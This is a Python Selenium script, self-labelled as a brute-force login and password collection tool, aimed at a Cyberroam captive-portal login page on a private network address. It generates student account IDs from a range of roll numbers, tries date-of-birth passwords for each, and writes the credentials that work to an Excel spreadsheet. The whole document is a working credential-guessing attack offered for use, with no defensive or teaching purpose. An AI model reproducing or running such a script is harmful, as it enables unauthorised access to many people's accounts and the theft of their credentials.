#Brute force login and password collection script for Cyberroam. 

from selenium import webdriver
import webbrowser
from openpyxl import load_workbook
import os
from selenium.common.exceptions import NoSuchElementException
from selenium.common.exceptions import UnexpectedAlertPresentException

#Creating excel Sheet for logging data
os.chdir('c:\\Users\\<username>\\Documents')

startRoll = 10001
endRoll = 10799
complete = 0
excelRoll = 0
#Initializing the roll
be = 'btech'
yr = '18'

while complete != 1:
    try:
        browser = webdriver.Firefox()
        # Cyberroam
        browser.get('https://172.16.1.1:8090')

        # Setting Various elements of the Login Page that we will need. 
        elem1 = browser.find_element_by_css_selector('#usernametxt > td:nth-child(1) > input:nth-child(1)')
        elem2 = browser.find_element_by_css_selector('.tablecss > table:nth-child(1) > tbody:nth-child(1) > tr:nth-child(4) > td:nth-child(1) > input:nth-child(1)')
        elem3 = browser.find_element_by_css_selector('#logincaption')

        for roll in range(startRoll, endRoll):
            login = be + str(roll) + yr

            if(roll == 10800):
                complete = 1

            flag = 0
            wb = load_workbook(filename = 'LoginInfo.xlsx')
            ws = wb['Sheet1']

            for year in range(98, 100):
                for month in range(1,13):
                    for day in range(1, 32):
                        if month < 10:
                            pwd = str(day) + '0' + str(month) + str(year)
                        else:
                            pwd = str(day) + str(month) + str(year)
                        
                        elem1.clear()
                        elem1.send_keys(login)  # Enter login ID
                        elem2.send_keys(pwd)    # Enter password
                        elem3.click()           # Click login

                        try:
                            elem4 = browser.find_element_by_css_selector('.note > xmp:nth-child(1)')
                            # Checks if login was successful
                           
                            # Writes to Excel File
                            ws.cell(row = excelRoll, column = 1).value = login
                            ws.cell(row = excelRoll, column = 2).value = pwd
                            wb.save('LoginInfo1.xlsx')
                            excelRoll = excelRoll + 1
                            flag = 1
                            elem3.click()
                        except NoSuchElementException:
                            continue

                        if(flag == 1):
                            break
                    if(flag == 1):
                        break
                if(flag == 1):
                    break
                        
            if(flag != 1):
                for year in range(0, 2):
                    for month in range(1,13):
                        for day in range(1, 32):
                            if month < 10:
                                pwd = str(day) + '0' + str(month) + '0' + str(year)
                            else:
                                pwd = str(day) + str(month) + '0' + str(year)
                            
                            elem1.clear()
                            elem1.send_keys(login)  # Enter login ID
                            elem2.send_keys(pwd)    # Enter password
                            elem3.click()           # Click login
                            try:
                                elem4 = browser.find_element_by_css_selector('.note > xmp:nth-child(1)')
                                
                                ws.cell(row = excelRoll, column = 1).value = login
                                ws.cell(row = excelRoll, column = 2).value = pwd
                                wb.save('LoginInfo1.xlsx')
                                excelRoll = excelRoll + 1
                                flag = 1
                                elem3.click()
                            except NoSuchElementException:
                                  continue
                                        
                            if(flag == 1):
                                break
                        if(flag == 1):
                            break
                    if(flag == 1):
                        break
    except UnexpectedAlertPresentException:
        startRoll = roll
        continue
                
wb.save('LoginInfo.xlsx')
    
        
